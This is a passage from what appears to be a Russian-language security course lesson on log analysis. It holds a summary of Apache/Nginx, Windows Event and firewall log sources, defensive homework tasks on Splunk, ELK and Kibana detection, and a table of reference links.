- **Apache/Nginx логи** содержат IP, метод, путь, статус и User-Agent — базу для выявления сканирования, брутфорса и инъекций
- **Windows Event Log** — критические Event ID: 4624, 4625, 4688, 4697, 4720, 4732, 1102
- **Firewall логи** (iptables, pfSense, ASA) фиксируют попытки подключения на уровне сети
- **Корреляция** нескольких источников даёт полную картину атаки: сеть → веб → ОС
- **Splunk SPL** и **ELK Query DSL** — основные инструменты аналитика для поиска аномалий
- Автоматизация анализа на Python позволяет обрабатывать миллионы строк быстро

---

## 🏠 Домашнее задание

1. Скачайте тестовый access.log с [OWASP Testing Guide samples] и запустите скрипт из раздела 6.4.4. Сколько аномалий найдено?

2. Настройте Logstash pipeline для сбора Windows Event Log через Winlogbeat в ELK. Создайте alert на EventID 4732.

3. Напишите Splunk-запрос, который обнаруживает атаку "Pass the Hash" (EventID 4624, Logon Type 3, AuthPackage=NTLM, без доменного имени в TargetUserName).

4. Проанализируйте реальные firewall логи: сгенерируйте тестовый трафик через nmap, поймайте его в iptables LOG и напишите скрипт автоматического блокирования IP при > 100 дропах за 5 минут.

5. Создайте в Kibana дашборд с 4 визуализациями: топ-атакующие IP, тренд ошибок аутентификации, карта источников атак, тип протокола.

---

## 🔗 Полезные ресурсы

| Ресурс | Ссылка |
|--------|--------|
| Apache Log Docs | https://httpd.apache.org/docs/current/logs.html |
| Windows Event ID Reference | https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/ |
| Splunk Search Reference | https://docs.splunk.com/Documentation/Splunk/latest/SearchReference |
| ELK Query DSL | https://www.elastic.co/guide/en/elasticsearch/reference/current/query-dsl.html |
| SANS Log Analysis | https://www.sans.org/reading-room/whitepapers/logging/ |
| python-evtx | https://github.com/williballenthin/python-evtx |
| Sigma Rules | https://github.com/SigmaHQ/sigma |
| OWASP Testing Guide | https://owasp.org/www-project-web-security-testing-guide/ |
